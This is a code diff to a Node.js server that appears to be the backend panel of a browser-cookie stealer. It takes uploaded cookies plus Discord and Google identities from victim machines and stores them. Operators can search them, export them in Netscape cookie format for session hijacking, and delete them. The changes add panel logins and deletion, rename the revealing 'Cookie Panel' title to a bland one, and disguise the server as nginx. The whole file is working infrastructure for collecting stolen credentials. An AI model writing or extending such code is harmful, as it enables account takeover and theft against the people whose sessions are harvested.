@@ -5,35 +5,76 @@ const crypto = require("crypto");
 
 const app = express();
 const PORT = process.env.PORT || 7700;
-const API_KEY = process.env.API_KEY || "changeme_" + crypto.randomBytes(8).toString("hex");
+const API_KEY = process.env.API_KEY || "changeme";
 const DATA_DIR = path.join(__dirname, "data");
+
+// ── Panel users (env: USERS=user1:pass1,user2:pass2) ──
+const USERS = {};
+(process.env.USERS || "admin:admin").split(",").forEach(pair => {
+  const [u, p] = pair.split(":");
+  if (u && p) USERS[u.trim()] = p.trim();
+});
+
+// Session tokens (in-memory)
+const sessions = new Map();
 
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 
 app.use(express.json({ limit: "50mb" }));
+app.use(express.urlencoded({ extended: true }));
 
-// ── Strip all identifying headers ──
+// ── Strip identifying headers ──
 app.use((req, res, next) => {
   res.removeHeader("X-Powered-By");
   res.setHeader("Server", "nginx");
   next();
 });
 
-// ── Auth middleware for upload ──
-function authCheck(req, res, next) {
+// ── Upload auth (API key) ──
+function authUpload(req, res, next) {
   const key = req.headers["x-api-key"] || req.query.key;
   if (key !== API_KEY) return res.status(401).json({ error: "unauthorized" });
   next();
 }
 
-// ── Upload cookies from a machine ──
-app.post("/api/upload", authCheck, (req, res) => {
+// ── Panel auth (session cookie) ──
+function authPanel(req, res, next) {
+  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
+  if (token && sessions.has(token)) return next();
+  // API calls get 401, page requests get redirect
+  if (req.path.startsWith("/api/")) return res.status(401).json({ error: "unauthorized" });
+  res.redirect("/login");
+}
+
+// ── Login page ──
+app.get("/login", (req, res) => {
+  res.send(LOGIN_HTML);
+});
+
+app.post("/login", (req, res) => {
+  const { username, password } = req.body;
+  if (USERS[username] && USERS[username] === password) {
+    const token = crypto.randomBytes(32).toString("hex");
+    sessions.set(token, { user: username, created: Date.now() });
+    res.setHeader("Set-Cookie", `sid=${token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=604800`);
+    return res.redirect("/");
+  }
+  res.send(LOGIN_HTML.replace("<!--ERR-->", '<p style="color:#f85149;margin-top:12px">Usuario o contraseña incorrectos</p>'));
+});
+
+app.get("/logout", (req, res) => {
+  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
+  if (token) sessions.delete(token);
+  res.setHeader("Set-Cookie", "sid=; Path=/; Max-Age=0");
+  res.redirect("/login");
+});
+
+// ── Upload endpoint (API key auth, no session needed) ──
+app.post("/api/upload", authUpload, (req, res) => {
   const { machineId, identity, cookies, timestamp } = req.body;
   if (!machineId || !cookies) return res.status(400).json({ error: "machineId and cookies required" });
-
   const safeId = machineId.replace(/[^a-zA-Z0-9_-]/g, "_").substring(0, 64);
   const filePath = path.join(DATA_DIR, safeId + ".json");
-
   const record = {
     machineId: safeId,
     identity: identity || { discord: null, google: [] },
@@ -42,13 +83,14 @@ app.post("/api/upload", authCheck, (req, res) => {
     domains: [...new Set(cookies.map(c => c.domain.replace(/^\./, "")))].sort(),
     cookies
   };
-
   fs.writeFileSync(filePath, JSON.stringify(record, null, 2), "utf8");
   console.log(`[+] ${safeId}: ${cookies.length} cookies, ${record.domains.length} domains`);
   res.json({ ok: true, stored: cookies.length });
 });
 
-// ── Get all machines ──
+// ── All routes below require panel login ──
+app.use(authPanel);
+
 app.get("/api/machines", (req, res) => {
   const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith(".json"));
   const machines = files.map(f => {
@@ -64,50 +106,86 @@ app.get("/api/machines", (req, res) => {
   res.json(machines);
 });
 
-// ── Get cookies for a machine ──
 app.get("/api/cookies/:machineId", (req, res) => {
   const safeId = req.params.machineId.replace(/[^a-zA-Z0-9_-]/g, "_");
   const filePath = path.join(DATA_DIR, safeId + ".json");
   if (!fs.existsSync(filePath)) return res.status(404).json({ error: "not found" });
-  const data = JSON.parse(fs.readFileSync(filePath, "utf8"));
-  res.json(data);
+  res.json(JSON.parse(fs.readFileSync(filePath, "utf8")));
 });
 
-// ── Get ALL cookies combined ──
 app.get("/api/cookies", (req, res) => {
   const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith(".json"));
   const all = [];
   for (const f of files) {
     const data = JSON.parse(fs.readFileSync(path.join(DATA_DIR, f), "utf8"));
-    for (const c of data.cookies) {
-      c._machine = data.machineId;
-      c._updated = data.lastUpdated;
-      all.push(c);
-    }
+    for (const c of data.cookies) { c._machine = data.machineId; c._updated = data.lastUpdated; all.push(c); }
   }
   res.json({ cookies: all, total: all.length });
 });
 
-// ── Panel HTML ──
-app.get("/", (req, res) => {
-  res.send(PANEL_HTML);
+// ── Delete a machine ──
+app.delete("/api/machines/:machineId", (req, res) => {
+  const safeId = req.params.machineId.replace(/[^a-zA-Z0-9_-]/g, "_");
+  const filePath = path.join(DATA_DIR, safeId + ".json");
+  if (!fs.existsSync(filePath)) return res.status(404).json({ error: "not found" });
+  fs.unlinkSync(filePath);
+  console.log(`[-] Deleted: ${safeId}`);
+  res.json({ ok: true, deleted: safeId });
 });
 
+// ── Delete ALL machines ──
+app.delete("/api/machines", (req, res) => {
+  const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith(".json"));
+  for (const f of files) fs.unlinkSync(path.join(DATA_DIR, f));
+  console.log(`[-] Deleted all: ${files.length} machines`);
+  res.json({ ok: true, deleted: files.length });
+});
+
+// ── Panel ──
+app.get("/", (req, res) => { res.send(PANEL_HTML); });
+
+// ── Login HTML ──
+const LOGIN_HTML = `<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Login</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0f;color:#c8d6e5;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.box{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:36px;width:340px}
+h2{color:#58a6ff;margin-bottom:20px;text-align:center;font-size:18px}
+label{font-size:13px;color:#8b949e;display:block;margin-bottom:4px}
+input{width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:10px 12px;border-radius:6px;font-size:14px;margin-bottom:14px;outline:none}
+input:focus{border-color:#58a6ff}
+button{width:100%;background:#1f6feb;border:none;color:#fff;padding:10px;border-radius:6px;font-size:14px;cursor:pointer}
+button:hover{background:#388bfd}
+</style></head><body>
+<div class="box">
+<h2>🔒 Panel Access</h2>
+<form method="POST" action="/login">
+<label>Usuario</label><input name="username" required autofocus>
+<label>Contraseña</label><input name="password" type="password" required>
+<button type="submit">Ingresar</button>
+</form>
+<!--ERR-->
+</div></body></html>`;
+
+// ── Panel HTML ──
 const PANEL_HTML = `<!DOCTYPE html>
 <html lang="es">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Cookie Panel — Central</title>
+<title>Panel</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0f;color:#c8d6e5;min-height:100vh}
 .top-bar{background:linear-gradient(135deg,#0d1117,#161b22);border-bottom:1px solid #30363d;padding:16px 24px;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
 .top-bar h1{font-size:20px;color:#58a6ff;flex-shrink:0}
-.top-bar .stats{font-size:13px;color:#8b949e;display:flex;gap:18px;flex-wrap:wrap}
+.top-bar .stats{font-size:13px;color:#8b949e;display:flex;gap:18px;flex-wrap:wrap;flex:1}
 .top-bar .stats span{color:#c9d1d9}
 .dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:4px;vertical-align:middle}
-.dot-green{background:#3fb950}.dot-red{background:#f85149}.dot-yellow{background:#d29922}
+.dot-green{background:#3fb950}
+.top-bar .right{margin-left:auto}
 .tabs{display:flex;gap:0;border-bottom:1px solid #21262d;background:#0d1117}
 .tab{padding:12px 20px;cursor:pointer;color:#8b949e;font-size:14px;border-bottom:2px solid transparent;transition:all .15s}
 .tab:hover{color:#c9d1d9}.tab.active{color:#58a6ff;border-bottom-color:#58a6ff}
@@ -119,10 +197,12 @@ button{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:8px 16p
 button:hover{background:#30363d}
 .btn-blue{background:#1f6feb;border-color:#1f6feb;color:#fff}.btn-blue:hover{background:#388bfd}
 .btn-green{background:#238636;border-color:#238636;color:#fff}.btn-green:hover{background:#2ea043}
+.btn-red{background:#da3633;border-color:#da3633;color:#fff}.btn-red:hover{background:#f85149}
+.btn-sm{padding:4px 10px;font-size:12px}
 .container{padding:20px 24px}
-.machine-card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:18px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;cursor:pointer;transition:border-color .15s}
+.machine-card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:18px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;transition:border-color .15s}
 .machine-card:hover{border-color:#58a6ff}
-.machine-info h3{color:#58a6ff;font-size:16px;margin-bottom:4px}
+.machine-info h3{color:#58a6ff;font-size:16px;margin-bottom:4px;cursor:pointer}
 .machine-info p{color:#8b949e;font-size:13px}
 .machine-stats{display:flex;gap:16px;align-items:center}
 .machine-stats .stat{text-align:center}
@@ -151,228 +231,132 @@ button:hover{background:#30363d}
 </head>
 <body>
 <div class="top-bar">
-  <h1>🍪 Cookie Panel — Central</h1>
+  <h1>Panel</h1>
   <div class="stats">
     <div><span class="dot dot-green"></span>Máquinas: <span id="s-machines">0</span></div>
     <div>Total cookies: <span id="s-total">0</span></div>
     <div>Dominios: <span id="s-domains">0</span></div>
   </div>
+  <div class="right"><a href="/logout" style="color:#8b949e;font-size:13px;text-decoration:none">Cerrar sesión ⏻</a></div>
 </div>
 <div class="tabs">
-  <div class="tab active" data-tab="machines" onclick="switchTab('machines')">📡 Máquinas</div>
-  <div class="tab" data-tab="cookies" onclick="switchTab('cookies')">🍪 Todas las Cookies</div>
+  <div class="tab active" data-tab="machines" onclick="switchTab('machines')">Máquinas</div>
+  <div class="tab" data-tab="cookies" onclick="switchTab('cookies')">Todas las Cookies</div>
 </div>
 <div class="controls">
   <input type="text" id="search" placeholder="Buscar dominio, cookie o máquina...">
-  <select id="sort">
-    <option value="alpha">A → Z</option>
-    <option value="count">Más cookies primero</option>
-  </select>
+  <select id="sort"><option value="alpha">A → Z</option><option value="count">Más cookies primero</option></select>
   <select id="machine-filter"><option value="all">Todas las máquinas</option></select>
   <button class="btn-blue" onclick="downloadFiltered('txt')">⬇ .txt</button>
   <button class="btn-blue" onclick="downloadFiltered('json')">⬇ .json</button>
   <button class="btn-green" onclick="refresh()">⟳ Actualizar</button>
+  <button class="btn-red" onclick="deleteAll()">🗑 Borrar todo</button>
 </div>
-
 <div class="container" id="tab-machines"></div>
 <div class="container hidden" id="tab-cookies"></div>
 <div id="toast"></div>
 
 <script>
-let MACHINES = [];
-let ALL_COOKIES = [];
-let currentTab = "machines";
-let selectedMachine = "all";
+let MACHINES=[], ALL_COOKIES=[], currentTab="machines";
 
-async function fetchMachines() {
-  const r = await fetch("/api/machines");
-  MACHINES = await r.json();
-  const sel = document.getElementById("machine-filter");
-  const prev = sel.value;
-  sel.innerHTML = '<option value="all">Todas las máquinas</option>';
-  for (const m of MACHINES) sel.innerHTML += '<option value="'+esc(m.machineId)+'">'+esc(m.machineId)+'</option>';
-  sel.value = prev || "all";
-}
+async function fetchMachines(){const r=await fetch("/api/machines");if(r.status===401)return location.href="/login";MACHINES=await r.json();const sel=document.getElementById("machine-filter");const prev=sel.value;sel.innerHTML='<option value="all">Todas las máquinas</option>';for(const m of MACHINES)sel.innerHTML+='<option value="'+esc(m.machineId)+'">'+esc(m.machineId)+'</option>';sel.value=prev||"all"}
+async function fetchAllCookies(){const r=await fetch("/api/cookies");if(r.status===401)return location.href="/login";const d=await r.json();ALL_COOKIES=d.cookies}
 
-async function fetchAllCookies() {
-  const r = await fetch("/api/cookies");
-  const d = await r.json();
-  ALL_COOKIES = d.cookies;
-}
+function switchTab(t){currentTab=t;document.querySelectorAll(".tab").forEach(x=>x.classList.toggle("active",x.dataset.tab===t));document.getElementById("tab-machines").classList.toggle("hidden",t!=="machines");document.getElementById("tab-cookies").classList.toggle("hidden",t!=="cookies");render()}
+async function refresh(){await fetchMachines();await fetchAllCookies();render();toast("Actualizado")}
 
-async function fetchMachineCookies(id) {
-  const r = await fetch("/api/cookies/" + encodeURIComponent(id));
-  return await r.json();
-}
+function render(){updateStats();if(currentTab==="machines")renderMachines();else renderCookies()}
+function updateStats(){document.getElementById("s-machines").textContent=MACHINES.length;document.getElementById("s-total").textContent=ALL_COOKIES.length;document.getElementById("s-domains").textContent=new Set(ALL_COOKIES.map(c=>(c.domain||"").replace(/^\\./,""))).size}
 
-function switchTab(tab) {
-  currentTab = tab;
-  document.querySelectorAll(".tab").forEach(t => t.classList.toggle("active", t.dataset.tab === tab));
-  document.getElementById("tab-machines").classList.toggle("hidden", tab !== "machines");
-  document.getElementById("tab-cookies").classList.toggle("hidden", tab !== "cookies");
-  render();
-}
-
-async function refresh() {
-  await fetchMachines();
-  await fetchAllCookies();
-  render();
-  toast("Actualizado");
-}
-
-function render() {
-  updateStats();
-  if (currentTab === "machines") renderMachines();
-  else renderCookies();
-}
-
-function updateStats() {
-  document.getElementById("s-machines").textContent = MACHINES.length;
-  document.getElementById("s-total").textContent = ALL_COOKIES.length;
-  document.getElementById("s-domains").textContent = new Set(ALL_COOKIES.map(c => (c.domain||"").replace(/^\\./, ""))).size;
-}
-
-function renderMachines() {
-  const el = document.getElementById("tab-machines");
-  if (!MACHINES.length) { el.innerHTML = '<div class="empty">No hay máquinas conectadas aún</div>'; return; }
-  let html = "";
-  for (const m of MACHINES) {
-    const ago = timeAgo(m.lastUpdated);
-    const id = m.identity || {};
-    const dc = id.discord;
-    const gg = (id.google || []);
-
-    let discordTag = '<span style="color:#484f58">—</span>';
-    if (dc) {
-      const avatar = dc.avatar ? 'https://cdn.discordapp.com/avatars/'+dc.id+'/'+dc.avatar+'.png?size=32' : 'https://cdn.discordapp.com/embed/avatars/0.png';
-      const name = dc.globalName || dc.username;
-      discordTag = '<img src="'+avatar+'" style="width:20px;height:20px;border-radius:50%;vertical-align:middle;margin-right:6px"><span style="color:#5865F2;font-weight:600">'+esc(name)+'</span> <span style="color:#8b949e;font-size:12px">@'+esc(dc.username)+'</span>';
+function renderMachines(){
+  const el=document.getElementById("tab-machines");
+  if(!MACHINES.length){el.innerHTML='<div class="empty">No hay máquinas conectadas aún</div>';return}
+  let html="";
+  for(const m of MACHINES){
+    const ago=timeAgo(m.lastUpdated);
+    const id=m.identity||{};
+    const dc=id.discord;
+    const gg=(id.google||[]);
+    let discordTag='<span style="color:#484f58">—</span>';
+    if(dc){
+      const avatar=dc.avatar?'https://cdn.discordapp.com/avatars/'+dc.id+'/'+dc.avatar+'.png?size=32':'https://cdn.discordapp.com/embed/avatars/0.png';
+      const name=dc.globalName||dc.username;
+      discordTag='<img src="'+avatar+'" style="width:20px;height:20px;border-radius:50%;vertical-align:middle;margin-right:6px"><span style="color:#5865F2;font-weight:600">'+esc(name)+'</span> <span style="color:#8b949e;font-size:12px">@'+esc(dc.username)+'</span>';
     }
+    let googleTag='<span style="color:#484f58">—</span>';
+    if(gg.length){googleTag=gg.map(g=>'<span style="color:#ea4335;margin-right:4px">●</span><span style="font-weight:600">'+esc(g.displayName)+'</span>').join(' · ')}
+    html+='<div class="machine-card">';
+    html+='<div class="machine-info"><h3 onclick="viewMachine(\\''+esc(m.machineId)+'\\')">'+esc(m.machineId)+'</h3>';
+    html+='<div style="margin-top:8px;display:flex;flex-direction:column;gap:5px">';
+    html+='<div style="font-size:13px"><span style="color:#5865F2;margin-right:6px">Discord:</span>'+discordTag+'</div>';
+    html+='<div style="font-size:13px"><span style="color:#ea4335;margin-right:6px">Google:</span>'+googleTag+'</div>';
+    html+='</div><p style="margin-top:6px">Actualizado: '+ago+'</p></div>';
+    html+='<div class="machine-stats">';
+    html+='<div class="stat"><div class="n">'+m.cookieCount+'</div><div class="l">cookies</div></div>';
+    html+='<div class="stat"><div class="n">'+m.domainCount+'</div><div class="l">dominios</div></div>';
+    html+='<div style="margin-left:12px"><button class="btn-red btn-sm" onclick="deleteMachine(\\''+esc(m.machineId)+'\\')">🗑</button></div>';
+    html+='</div></div>';
+  }
+  el.innerHTML=html;
+}
 
-    let googleTag = '<span style="color:#484f58">—</span>';
-    if (gg.length) {
-      googleTag = gg.map(g => '<span style="color:#ea4335;margin-right:4px">●</span><span style="font-weight:600">'+esc(g.displayName)+'</span>').join(' · ');
+function viewMachine(id){document.getElementById("machine-filter").value=id;switchTab("cookies")}
+
+function renderCookies(){
+  const el=document.getElementById("tab-cookies");
+  const q=document.getElementById("search").value.toLowerCase();
+  const sort=document.getElementById("sort").value;
+  const mf=document.getElementById("machine-filter").value;
+  let filtered=ALL_COOKIES;
+  if(mf!=="all")filtered=filtered.filter(c=>c._machine===mf);
+  if(q)filtered=filtered.filter(c=>(c.domain||"").toLowerCase().includes(q)||(c.name||"").toLowerCase().includes(q)||(c._machine||"").toLowerCase().includes(q));
+  const groups={};
+  for(const c of filtered){const d=(c.domain||"").replace(/^\\./,"");if(!groups[d])groups[d]=[];groups[d].push(c)}
+  let domains=Object.keys(groups);
+  if(sort==="alpha")domains.sort();else domains.sort((a,b)=>groups[b].length-groups[a].length);
+  if(!domains.length){el.innerHTML='<div class="empty">No se encontraron cookies'+(q?' para "'+esc(q)+'"':'')+'</div>';return}
+  let html="";const now=Date.now()/1000;
+  for(const d of domains){
+    const cookies=groups[d];
+    html+='<div class="domain-group">';
+    html+='<div class="domain-header" onclick="this.parentElement.classList.toggle(\\'open\\')">';
+    html+='<span class="domain-name">'+esc(d)+'</span>';
+    html+='<div class="domain-actions">';
+    html+='<button onclick="event.stopPropagation();downloadDomain(\\''+esc(d)+'\\',\\'txt\\')">txt</button>';
+    html+='<button onclick="event.stopPropagation();downloadDomain(\\''+esc(d)+'\\',\\'json\\')">json</button>';
+    html+='<span class="domain-count">'+cookies.length+'</span></div></div>';
+    html+='<table class="cookie-table"><thead><tr><th>Máquina</th><th>Nombre</th><th>Valor</th><th>Path</th><th>Expira</th><th>Flags</th></tr></thead><tbody>';
+    for(const c of cookies){
+      const exp=c.expires===0?'<span class="tag tag-session">session</span>':(c.expires<now?'<span class="tag tag-expired">expired</span>':new Date(c.expires*1000).toLocaleDateString("es-AR"));
+      let flags="";if(c.secure)flags+='<span class="tag tag-secure">Secure</span> ';if(c.httpOnly)flags+='<span class="tag tag-http">HttpOnly</span> ';
+      html+='<tr><td>'+esc(c._machine||"—")+'</td><td title="'+esc(c.name)+'">'+esc(c.name)+'</td><td title="'+esc(c.value)+'">'+esc(c.value)+'</td><td>'+esc(c.path)+'</td><td>'+exp+'</td><td>'+flags+'</td></tr>';
     }
-
-    html += '<div class="machine-card" onclick="viewMachine(\\''+esc(m.machineId)+'\\')">';
-    html += '<div class="machine-info"><h3>'+esc(m.machineId)+'</h3>';
-    html += '<div style="margin-top:8px;display:flex;flex-direction:column;gap:5px">';
-    html += '<div style="font-size:13px"><span style="color:#5865F2;margin-right:6px">Discord:</span>'+discordTag+'</div>';
-    html += '<div style="font-size:13px"><span style="color:#ea4335;margin-right:6px">Google:</span>'+googleTag+'</div>';
-    html += '</div>';
-    html += '<p style="margin-top:6px">Actualizado: '+ago+'</p></div>';
-    html += '<div class="machine-stats"><div class="stat"><div class="n">'+m.cookieCount+'</div><div class="l">cookies</div></div>';
-    html += '<div class="stat"><div class="n">'+m.domainCount+'</div><div class="l">dominios</div></div></div>';
-    html += '</div>';
+    html+='</tbody></table></div>';
   }
-  el.innerHTML = html;
+  el.innerHTML=html;
 }
 
-function viewMachine(id) {
-  document.getElementById("machine-filter").value = id;
-  selectedMachine = id;
-  switchTab("cookies");
-}
+async function deleteMachine(id){if(!confirm("Borrar "+id+" y todas sus cookies?"))return;await fetch("/api/machines/"+encodeURIComponent(id),{method:"DELETE"});toast("Borrado: "+id);refresh()}
+async function deleteAll(){if(!confirm("Borrar TODAS las máquinas y cookies?"))return;await fetch("/api/machines",{method:"DELETE"});toast("Todo borrado");refresh()}
 
-function renderCookies() {
-  const el = document.getElementById("tab-cookies");
-  const q = document.getElementById("search").value.toLowerCase();
-  const sort = document.getElementById("sort").value;
-  const mf = document.getElementById("machine-filter").value;
+function timeAgo(iso){if(!iso)return"—";const s=Math.floor((Date.now()-new Date(iso).getTime())/1000);if(s<60)return"hace "+s+"s";if(s<3600)return"hace "+Math.floor(s/60)+"min";if(s<86400)return"hace "+Math.floor(s/3600)+"h";return"hace "+Math.floor(s/86400)+"d"}
+function esc(s){if(!s)return"";const d=document.createElement("div");d.textContent=s;return d.innerHTML}
 
-  let filtered = ALL_COOKIES;
-  if (mf !== "all") filtered = filtered.filter(c => c._machine === mf);
-  if (q) filtered = filtered.filter(c => (c.domain||"").toLowerCase().includes(q) || (c.name||"").toLowerCase().includes(q) || (c._machine||"").toLowerCase().includes(q));
+function downloadBlob(name,content,type){const a=document.createElement("a");a.href=URL.createObjectURL(new Blob([content],{type}));a.download=name;a.click();toast("Descargado: "+name)}
+function downloadFiltered(fmt){const mf=document.getElementById("machine-filter").value;let cookies=ALL_COOKIES;if(mf!=="all")cookies=cookies.filter(c=>c._machine===mf);const name=(mf==="all"?"all":mf)+"_cookies";if(fmt==="json")downloadBlob(name+".json",JSON.stringify(cookies,null,2),"application/json");else downloadBlob(name+".txt",toNetscape(cookies),"text/plain")}
+function downloadDomain(domain,fmt){const cookies=ALL_COOKIES.filter(c=>(c.domain||"").replace(/^\\./,"")===domain);if(fmt==="json")downloadBlob(domain+"_cookies.json",JSON.stringify(cookies,null,2),"application/json");else downloadBlob(domain+"_cookies.txt",toNetscape(cookies),"text/plain")}
+function toNetscape(cookies){let out="# Netscape HTTP Cookie File\\n\\n";for(const c of cookies)out+=(c.httpOnly?"#HttpOnly_":"")+c.domain+"\\tTRUE\\t"+c.path+"\\t"+(c.secure?"TRUE":"FALSE")+"\\t"+c.expires+"\\t"+c.name+"\\t"+c.value+"\\n";return out}
+function toast(msg){const t=document.getElementById("toast");t.textContent=msg;t.style.display="block";setTimeout(()=>t.style.display="none",2500)}
 
-  const groups = {};
-  for (const c of filtered) {
-    const d = (c.domain||"").replace(/^\\./, "");
-    if (!groups[d]) groups[d] = [];
-    groups[d].push(c);
-  }
+document.getElementById("search").addEventListener("input",render);
+document.getElementById("sort").addEventListener("change",render);
+document.getElementById("machine-filter").addEventListener("change",()=>render());
 
-  let domains = Object.keys(groups);
-  if (sort === "alpha") domains.sort();
-  else domains.sort((a, b) => groups[b].length - groups[a].length);
-
-  if (!domains.length) { el.innerHTML = '<div class="empty">No se encontraron cookies'+(q?' para "'+esc(q)+'"':'')+'</div>'; return; }
-
-  let html = "";
-  const now = Date.now() / 1000;
-  for (const d of domains) {
-    const cookies = groups[d];
-    html += '<div class="domain-group">';
-    html += '<div class="domain-header" onclick="this.parentElement.classList.toggle(\\'open\\')">';
-    html += '<span class="domain-name">'+esc(d)+'</span>';
-    html += '<div class="domain-actions">';
-    html += '<button onclick="event.stopPropagation();downloadDomain(\\''+esc(d)+'\\',\\'txt\\')">txt</button>';
-    html += '<button onclick="event.stopPropagation();downloadDomain(\\''+esc(d)+'\\',\\'json\\')">json</button>';
-    html += '<span class="domain-count">'+cookies.length+'</span></div></div>';
-    html += '<table class="cookie-table"><thead><tr><th>Máquina</th><th>Nombre</th><th>Valor</th><th>Path</th><th>Expira</th><th>Flags</th></tr></thead><tbody>';
-    for (const c of cookies) {
-      const exp = c.expires === 0 ? '<span class="tag tag-session">session</span>' : (c.expires < now ? '<span class="tag tag-expired">expired</span>' : new Date(c.expires * 1000).toLocaleDateString("es-AR"));
-      let flags = "";
-      if (c.secure) flags += '<span class="tag tag-secure">Secure</span> ';
-      if (c.httpOnly) flags += '<span class="tag tag-http">HttpOnly</span> ';
-      html += '<tr><td>'+esc(c._machine||"—")+'</td><td title="'+esc(c.name)+'">'+esc(c.name)+'</td><td title="'+esc(c.value)+'">'+esc(c.value)+'</td><td>'+esc(c.path)+'</td><td>'+exp+'</td><td>'+flags+'</td></tr>';
-    }
-    html += '</tbody></table></div>';
-  }
-  el.innerHTML = html;
-}
-
-function timeAgo(iso) {
-  if (!iso) return "—";
-  const s = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
-  if (s < 60) return "hace " + s + "s";
-  if (s < 3600) return "hace " + Math.floor(s/60) + "min";
-  if (s < 86400) return "hace " + Math.floor(s/3600) + "h";
-  return "hace " + Math.floor(s/86400) + "d";
-}
-
-function esc(s) { if (!s) return ""; const d = document.createElement("div"); d.textContent = s; return d.innerHTML; }
-
-function downloadBlob(name, content, type) {
-  const a = document.createElement("a");
-  a.href = URL.createObjectURL(new Blob([content], { type }));
-  a.download = name; a.click();
-  toast("Descargado: " + name);
-}
-
-function downloadFiltered(fmt) {
-  const mf = document.getElementById("machine-filter").value;
-  let cookies = ALL_COOKIES;
-  if (mf !== "all") cookies = cookies.filter(c => c._machine === mf);
-  const name = (mf === "all" ? "all" : mf) + "_cookies";
-  if (fmt === "json") downloadBlob(name+".json", JSON.stringify(cookies, null, 2), "application/json");
-  else downloadBlob(name+".txt", toNetscape(cookies), "text/plain");
-}
-
-function downloadDomain(domain, fmt) {
-  const cookies = ALL_COOKIES.filter(c => (c.domain||"").replace(/^\\./, "") === domain);
-  if (fmt === "json") downloadBlob(domain+"_cookies.json", JSON.stringify(cookies, null, 2), "application/json");
-  else downloadBlob(domain+"_cookies.txt", toNetscape(cookies), "text/plain");
-}
-
-function toNetscape(cookies) {
-  let out = "# Netscape HTTP Cookie File\\n\\n";
-  for (const c of cookies) out += (c.httpOnly?"#HttpOnly_":"") + c.domain + "\\tTRUE\\t" + c.path + "\\t" + (c.secure?"TRUE":"FALSE") + "\\t" + c.expires + "\\t" + c.name + "\\t" + c.value + "\\n";
-  return out;
-}
-
-function toast(msg) { const t = document.getElementById("toast"); t.textContent = msg; t.style.display = "block"; setTimeout(() => t.style.display = "none", 2500); }
-
-document.getElementById("search").addEventListener("input", render);
-document.getElementById("sort").addEventListener("change", render);
-document.getElementById("machine-filter").addEventListener("change", () => { selectedMachine = document.getElementById("machine-filter").value; render(); });
-
-refresh();
-setInterval(refresh, 30000);
+refresh();setInterval(refresh,30000);
 </script>
-</body>
-</html>`;
+</body></html>`;
 
 app.listen(PORT, () => {
-  console.log(`[+] Cookie Server → http://localhost:${PORT}`);
-  console.log(`[+] API_KEY: ${API_KEY}`);
+  console.log("[+] Server → http://localhost:" + PORT);
+  console.log("[+] Users: " + Object.keys(USERS).join(", "));
 });
